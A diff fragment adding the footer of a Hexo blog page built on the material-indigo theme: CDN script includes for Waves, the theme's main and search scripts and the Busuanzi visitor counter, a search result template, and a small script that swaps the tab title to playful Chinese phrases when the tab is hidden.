+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
